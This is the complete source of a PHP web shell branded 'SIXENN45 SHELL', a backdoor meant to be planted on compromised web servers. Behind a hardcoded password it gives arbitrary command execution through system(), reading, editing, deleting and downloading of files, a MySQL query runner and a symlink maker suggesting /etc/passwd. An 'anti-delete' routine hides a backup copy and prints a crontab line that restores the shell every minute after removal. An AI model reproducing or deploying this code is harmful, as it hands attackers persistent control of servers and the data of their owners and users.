<?php
/*
 * SIXENN45 SHELL v5.0 - ULTIMATE EDITION
 * FILE MANAGER + TERMINAL + ANTI-DELETE SYSTEM
 * MADE WITH PURE HATE BY SIXENN
 */

session_start();
error_reporting(0);
@ini_set('display_errors', 0);

// CONFIG
$auth_pass = md5('jinx123');
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
@chdir($current_dir);

// LOGIN CHECK
if(!isset($_SESSION['auth'])) {
    if(isset($_POST['pass']) && md5($_POST['pass']) == $auth_pass) {
        $_SESSION['auth'] = true;
    } else {
        echo '<!DOCTYPE html><html><head><title>Login</title><style>body{background:#000;color:#0f0;font-family:monospace;margin:100px auto;width:300px;}</style></head><body>';
        echo '<form method="post"><input type="password" name="pass" placeholder="Password" style="width:100%;padding:10px;"><br>';
        echo '<input type="submit" value="Login" style="width:100%;padding:10px;background:#f00;color:white;margin-top:10px;"></form>';
        echo '</body></html>';
        exit;
    }
}

// FUNCTION: GET BREADCRUMB PATH
function getBreadcrumb($path) {
    $parts = explode('/', trim($path, '/'));
    $breadcrumb = '<a href="?dir=/">/</a> ';
    $current_path = '';
    
    foreach($parts as $i => $part) {
        if(empty($part)) continue;
        $current_path .= '/' . $part;
        $breadcrumb .= ' / <a href="?dir=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>';
    }
    
    return $breadcrumb;
}

// FUNCTION: LIST FILES WITH ICONS
function listFilesWithActions($dir) {
    $files = @scandir($dir);
    if(!$files) return "Cannot read directory";
    
    $html = '<table width="100%" cellspacing="0" cellpadding="5" style="background:#222;color:#0f0;border:1px solid #333;">';
    $html .= '<tr style="background:#333;"><th>Name</th><th>Size</th><th>Permission</th><th>Modified</th><th>Actions</th></tr>';
    
    // Go Up link
    if($dir != '/' && $dir != '') {
        $parent = dirname($dir);
        $html .= '<tr>';
        $html .= '<td colspan="5"><a href="?dir=' . urlencode($parent) . '" style="color:#0ff;">⬆️ [UP] Parent Directory</a></td>';
        $html .= '</tr>';
    }
    
    foreach($files as $file) {
        if($file == '.') continue;
        
        $fullpath = $dir . '/' . $file;
        $is_dir = @is_dir($fullpath);
        
        if($file == '..' && $dir == '/') continue;
        
        $size = $is_dir ? 'DIR' : (@filesize($fullpath) ?: '0') . ' bytes';
        $perms = @fileperms($fullpath) ? substr(sprintf('%o', @fileperms($fullpath)), -4) : '????';
        $modified = @filemtime($fullpath) ? date('Y-m-d H:i', @filemtime($fullpath)) : 'Unknown';
        
        $html .= '<tr>';
        
        // Name with icon
        $html .= '<td>';
        if($file == '..') {
            $html .= '⬆️ <a href="?dir=' . urlencode(dirname($dir)) . '">' . htmlspecialchars($file) . '</a>';
        } elseif($is_dir) {
            $html .= '📁 <a href="?dir=' . urlencode($fullpath) . '">' . htmlspecialchars($file) . '</a>';
        } else {
            $html .= '📄 ' . htmlspecialchars($file);
        }
        $html .= '</td>';
        
        // Other columns
        $html .= '<td>' . $size . '</td>';
        $html .= '<td>' . $perms . '</td>';
        $html .= '<td>' . $modified . '</td>';
        
        // Actions
        $html .= '<td nowrap>';
        if($file != '..') {
            if(!$is_dir) {
                $html .= '<a href="?dir=' . urlencode($dir) . '&view=' . urlencode($file) . '">👁️</a> ';
                $html .= '<a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '">✏️</a> ';
                $html .= '<a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">📝</a> ';
                $html .= '<a href="?dir=' . urlencode($dir) . '&chmod=' . urlencode($file) . '">🔧</a> ';
                $html .= '<a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '" onclick="return confirm(\'Delete?\')">🗑️</a> ';
                $html .= '<a href="?dir=' . urlencode($dir) . '&download=' . urlencode($file) . '">⬇️</a>';
            } else {
                $html .= '<a href="?dir=' . urlencode($dir) . '&chmod=' . urlencode($file) . '">🔧</a> ';
                $html .= '<a href="?dir=' . urlencode($dir) . '&rename=' . urlencode($file) . '">📝</a> ';
                $html .= '<a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '" onclick="return confirm(\'Delete folder?\')">🗑️</a>';
            }
        }
        $html .= '</td>';
        
        $html .= '</tr>';
    }
    
    $html .= '</table>';
    return $html;
}

// FUNCTION: CREATE ANTI-DELETE BACKUP
function createAntiDeleteBackup($backup_dir, $backup_name) {
    $current_shell = __FILE__;
    
    // Validate backup directory
    $backup_dir = rtrim($backup_dir, '/');
    $backup_path = $backup_dir . '/' . $backup_name;
    
    // Create directory if not exists
    if (!file_exists(dirname($backup_path))) {
        @mkdir(dirname($backup_path), 0755, true);
    }
    
    // Copy current shell to backup location
    $copy_result = @copy($current_shell, $backup_path);
    
    if (!$copy_result) {
        return [
            'success' => false,
            'error' => 'Failed to create backup copy'
        ];
    }
    
    @chmod($backup_path, 0644);
    
    // GENERATE SMART CRON COMMAND
    $cron_command = '(crontab -l 2>/dev/null; echo "* * * * * cp -f ' . 
                   escapeshellarg($backup_path) . ' ' . 
                   escapeshellarg($current_shell) . 
                   ' 2>/dev/null") | crontab -';
    
    return [
        'success' => true,
        'backup_path' => $backup_path,
        'current_shell' => $current_shell,
        'cron_command' => $cron_command,
        'backup_size' => filesize($backup_path)
    ];
}

// HANDLE BACKUP CREATION
$backup_result = null;
if (isset($_POST['create_backup'])) {
    $backup_dir = $_POST['backup_dir'] ?? '';
    $backup_name = $_POST['backup_name'] ?? '.shell_backup.php';
    
    if (!empty($backup_dir) && !empty($backup_name)) {
        $backup_result = createAntiDeleteBackup($backup_dir, $backup_name);
        $_SESSION['backup_result'] = $backup_result;
    }
}

// HANDLE FILE OPERATIONS
$action_message = '';

// View file
if(isset($_GET['view'])) {
    $file = $_GET['view'];
    $action_message = '<div style="background:#000;padding:10px;margin:10px 0;border:1px solid #0f0;">';
    $action_message .= '<h3>👁️ View: ' . htmlspecialchars($file) . '</h3>';
    $action_message .= '<pre style="overflow:auto;max-height:400px;">' . htmlspecialchars(@file_get_contents($file)) . '</pre>';
    $action_message .= '</div>';
}

// Edit file
if(isset($_GET['edit'])) {
    $file = $_GET['edit'];
    $content = @file_get_contents($file);
    
    $action_message = '<div style="background:#000;padding:10px;margin:10px 0;border:1px solid #0ff;">';
    $action_message .= '<h3>✏️ Edit: ' . htmlspecialchars($file) . '</h3>';
    $action_message .= '<form method="post">';
    $action_message .= '<input type="hidden" name="edit_file" value="' . htmlspecialchars($file) . '">';
    $action_message .= '<textarea name="content" rows="20" style="width:100%;">' . htmlspecialchars($content) . '</textarea><br>';
    $action_message .= '<input type="submit" value="💾 Save">';
    $action_message .= '</form>';
    $action_message .= '</div>';
    
    if(isset($_POST['edit_file']) && $_POST['edit_file'] == $file) {
        @file_put_contents($file, $_POST['content']);
        $action_message .= '<p style="color:#0f0;">✓ File saved!</p>';
    }
}

// Rename
if(isset($_GET['rename'])) {
    $file = $_GET['rename'];
    
    $action_message = '<div style="background:#000;padding:10px;margin:10px 0;border:1px solid #ff0;">';
    $action_message .= '<h3>📝 Rename: ' . htmlspecialchars($file) . '</h3>';
    $action_message .= '<form method="post">';
    $action_message .= '<input type="hidden" name="rename_old" value="' . htmlspecialchars($file) . '">';
    $action_message .= 'New Name: <input type="text" name="rename_new" value="' . htmlspecialchars($file) . '"><br>';
    $action_message .= '<input type="submit" value="Rename">';
    $action_message .= '</form>';
    $action_message .= '</div>';
    
    if(isset($_POST['rename_old'])) {
        $new_name = dirname($file) . '/' . $_POST['rename_new'];
        if(@rename($file, $new_name)) {
            $action_message .= '<p style="color:#0f0;">✓ Renamed to: ' . htmlspecialchars($_POST['rename_new']) . '</p>';
            echo '<meta http-equiv="refresh" content="1;url=?dir=' . urlencode($current_dir) . '">';
        }
    }
}

// Chmod
if(isset($_GET['chmod'])) {
    $file = $_GET['chmod'];
    $current_perm = substr(sprintf('%o', @fileperms($file)), -4);
    
    $action_message = '<div style="background:#000;padding:10px;margin:10px 0;border:1px solid #0af;">';
    $action_message .= '<h3>🔧 Change Permission: ' . htmlspecialchars(basename($file)) . '</h3>';
    $action_message .= '<form method="post">';
    $action_message .= '<input type="hidden" name="chmod_file" value="' . htmlspecialchars($file) . '">';
    $action_message .= 'Current: ' . $current_perm . '<br>';
    $action_message .= 'New (ex: 0755): <input type="text" name="chmod_perm" value="' . $current_perm . '"><br>';
    $action_message .= '<input type="submit" value="Change">';
    $action_message .= '</form>';
    $action_message .= '</div>';
    
    if(isset($_POST['chmod_file'])) {
        @chmod($_POST['chmod_file'], octdec($_POST['chmod_perm']));
        $action_message .= '<p style="color:#0f0;">✓ Permission changed!</p>';
    }
}

// Delete
if(isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if(@is_dir($file)) {
        @system('rm -rf ' . escapeshellarg($file));
    } else {
        @unlink($file);
    }
    echo '<meta http-equiv="refresh" content="0;url=?dir=' . urlencode($current_dir) . '">';
    exit;
}

// Download
if(isset($_GET['download'])) {
    $file = $_GET['download'];
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    @readfile($file);
    exit;
}

// OUTPUT HTML
echo '<!DOCTYPE html><html><head><title>SIXENN45 IN HERE</title>';
echo '<style>';
echo 'body{font-family:monospace;background:#111;color:#0f0;margin:20px;}';
echo 'a{color:#0ff;text-decoration:none;}';
echo 'input,textarea,select{background:#222;color:#0f0;border:1px solid #0f0;padding:5px;}';
echo '.menu{background:#1a1a1a;padding:10px;margin:10px 0;}';
echo '.path{background:#000;padding:10px;margin:10px 0;border:1px solid #333;}';
echo '.backup-box{background:#1a1a1a;padding:15px;margin:10px 0;border:2px solid #f00;}';
echo '.action-box{background:#000;padding:10px;margin:10px 0;border:1px solid #0f0;}';
echo '.success-box{background:#002200;padding:15px;margin:10px 0;border:1px solid #0f0;}';
echo '.command-box{background:#000;padding:10px;margin:10px 0;border:1px solid #0ff;overflow-x:auto;}';
echo '.danger-btn{background:#f00;color:white;padding:10px;border:none;cursor:pointer;font-weight:bold;}';
echo '</style>';
echo '</head><body>';

echo '<h1>☠ SHELL by SIXENN45</h1>';

// PATH BREADCRUMB
echo '<div class="path">';
echo '<strong>📁 Current Path:</strong> ' . getBreadcrumb($current_dir);
echo '</div>';

// ANTI-DELETE BACKUP FORM
echo '<div class="backup-box">';
echo '<h3>🛡️ ANTI-DELETE BACKUP SYSTEM</h3>';
echo '<form method="post">';
echo '<p><strong>Masukan lokasi file untuk backup:</strong></p>';
echo '<input type="text" name="backup_dir" placeholder="/home/' . get_current_user() . '/logs/" style="width:100%" value="/home/' . get_current_user() . '/logs/">';
echo '<p><strong>Masukan nama shell backup:</strong></p>';
echo '<input type="text" name="backup_name" placeholder=".hidden_backup.php" style="width:100%" value=".hidden_backup.php">';
echo '<p><button type="submit" name="create_backup" class="danger-btn">🔥 UPLOAD SHELL BACKUP ANTI DELETE</button></p>';
echo '</form>';
echo '</div>';

// DISPLAY BACKUP RESULTS
if (isset($_SESSION['backup_result']) && $_SESSION['backup_result']['success']) {
    $result = $_SESSION['backup_result'];
    
    echo '<div class="success-box">';
    echo '<h3>✅ BACKUP CREATED SUCCESSFULLY!</h3>';
    echo '<p><strong>Backup Location:</strong> ' . htmlspecialchars($result['backup_path']) . '</p>';
    echo '<p><strong>Original Shell:</strong> ' . htmlspecialchars($result['current_shell']) . '</p>';
    echo '</div>';
    
    echo '<div class="backup-box">';
    echo '<h3>⏰ CRON JOB SETUP</h3>';
    echo '<p><strong>Silakan ketik ini di terminal:</strong></p>';
    
    echo '<div class="command-box">';
    echo htmlspecialchars($result['cron_command']);
    echo '</div>';
    
    echo '<p><strong>📝 Cara menggunakan:</strong></p>';
    echo '<ol>';
    echo '<li>Buka terminal</li>';
    echo '<li>: <code>' . get_current_user() . '</code></li>';
    echo '<li>Copy command di atas</li>';
    echo '<li>Paste dan tekan ENTER</li>';
    echo '<li>Shell akan otomatis restore setiap menit jika terhapus!</li>';
    echo '</ol>';
    echo '</div>';
}

// ACTION MESSAGE
if(!empty($action_message)) {
    echo $action_message;
}

// QUICK MENU
echo '<div class="menu">';
echo '<a href="?dir=' . urlencode($current_dir) . '&action=upload">📤 Upload</a> | ';
echo '<a href="?dir=' . urlencode($current_dir) . '&action=newfile">📄 New File</a> | ';
echo '<a href="?dir=' . urlencode($current_dir) . '&action=newfolder">📁 New Folder</a> | ';
echo '<a href="?dir=' . urlencode($current_dir) . '&action=terminal">💻 Terminal</a> | ';
echo '<a href="?dir=' . urlencode($current_dir) . '&action=symlink">🔗 Symlink</a> | ';
echo '<a href="?dir=' . urlencode($current_dir) . '&action=sql">🗃️ SQL</a> | ';
echo '<a href="?logout" style="color:#f00;">🚪 Logout</a>';
echo '</div>';

// HANDLE QUICK ACTIONS
if(isset($_GET['action'])) {
    switch($_GET['action']) {
        case 'upload':
            echo '<div class="action-box">';
            echo '<h3>📤 Upload File</h3>';
            echo '<form method="post" enctype="multipart/form-data">';
            echo '<input type="file" name="file">';
            echo '<input type="submit" name="upload" value="Upload" class="danger-btn">';
            echo '</form>';
            
            if(isset($_FILES['file'])) {
                $target = $current_dir . '/' . basename($_FILES['file']['name']);
                if(@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                    echo '<p style="color:#0f0;">✓ Uploaded: ' . htmlspecialchars(basename($target)) . '</p>';
                }
            }
            echo '</div>';
            break;
            
        case 'newfile':
            echo '<div class="action-box">';
            echo '<h3>📄 Create New File</h3>';
            echo '<form method="post">';
            echo 'Filename: <input type="text" name="filename"><br>';
            echo 'Content: <textarea name="content" rows="5" style="width:100%"></textarea><br>';
            echo '<input type="submit" name="create" value="Create" class="danger-btn">';
            echo '</form>';
            
            if(isset($_POST['create'])) {
                $file = $current_dir . '/' . $_POST['filename'];
                @file_put_contents($file, $_POST['content']);
                echo '<p style="color:#0f0;">✓ File created!</p>';
            }
            echo '</div>';
            break;
            
        case 'newfolder':
            echo '<div class="action-box">';
            echo '<h3>📁 Create New Folder</h3>';
            echo '<form method="post">';
            echo 'Folder Name: <input type="text" name="foldername"><br>';
            echo '<input type="submit" name="create" value="Create" class="danger-btn">';
            echo '</form>';
            
            if(isset($_POST['create'])) {
                $folder = $current_dir . '/' . $_POST['foldername'];
                @mkdir($folder, 0755);
                echo '<p style="color:#0f0;">✓ Folder created!</p>';
            }
            echo '</div>';
            break;
            
        case 'terminal':
            echo '<div class="action-box">';
            echo '<h3>💻 Terminal</h3>';
            echo '<form method="post">';
            echo '<input type="text" name="cmd" placeholder="Command" style="width:80%">';
            echo '<input type="submit" value="Execute" class="danger-btn">';
            echo '</form>';
            
            if(isset($_POST['cmd'])) {
                echo '<pre style="background:#000;padding:10px;overflow:auto;">';
                @system($_POST['cmd']);
                echo '</pre>';
            }
            echo '</div>';
            break;
            
        case 'symlink':
            echo '<div class="action-box">';
            echo '<h3>🔗 Create Symlink</h3>';
            echo '<form method="post">';
            echo 'Target: <input type="text" name="target" placeholder="/etc/passwd"><br>';
            echo 'Link Name: <input type="text" name="linkname" placeholder="passwd_link"><br>';
            echo '<input type="submit" name="create" value="Create" class="danger-btn">';
            echo '</form>';
            
            if(isset($_POST['create'])) {
                @symlink($_POST['target'], $current_dir . '/' . $_POST['linkname']);
                echo '<p style="color:#0f0;">✓ Symlink created!</p>';
            }
            echo '</div>';
            break;
            
        case 'sql':
            echo '<div class="action-box">';
            echo '<h3>🗃️ SQL Manager</h3>';
            echo '<form method="post">';
            echo 'Host: <input type="text" name="sql_host" value="localhost"><br>';
            echo 'User: <input type="text" name="sql_user"><br>';
            echo 'Password: <input type="password" name="sql_pass"><br>';
            echo 'Database: <input type="text" name="sql_db"><br>';
            echo 'Query: <textarea name="sql_query" rows="3" style="width:100%"></textarea><br>';
            echo '<input type="submit" name="sql_exec" value="Execute" class="danger-btn">';
            echo '</form>';
            
            if(isset($_POST['sql_exec'])) {
                $conn = @mysqli_connect(
                    $_POST['sql_host'],
                    $_POST['sql_user'],
                    $_POST['sql_pass'],
                    $_POST['sql_db']
                );
                
                if($conn) {
                    $result = @mysqli_query($conn, $_POST['sql_query']);
                    if($result) {
                        echo '<p style="color:#0f0;">✓ Query executed!</p>';
                        if(is_object($result) && mysqli_num_rows($result) > 0) {
                            echo '<table style="background:#222;width:100%;">';
                            while($row = mysqli_fetch_assoc($result)) {
                                echo '<tr>';
                                foreach($row as $cell) {
                                    echo '<td style="border:1px solid #333;padding:5px;">' . htmlspecialchars($cell) . '</td>';
                                }
                                echo '</tr>';
                            }
                            echo '</table>';
                        }
                    }
                    @mysqli_close($conn);
                }
            }
            echo '</div>';
            break;
    }
}

// AUTO FILE LISTING
echo '<h3>📂 Directory Contents</h3>';
echo listFilesWithActions($current_dir);

// LOGOUT HANDLER
if(isset($_GET['logout'])) {
    session_destroy();
    echo '<meta http-equiv="refresh" content="0;url=?">';
    exit;
}

echo '<div style="text-align:center;margin-top:20px;color:#666;font-size:12px;">';
echo '☠️ Created By SIXENN45';
echo '</div>';

echo '</body></html>';
?>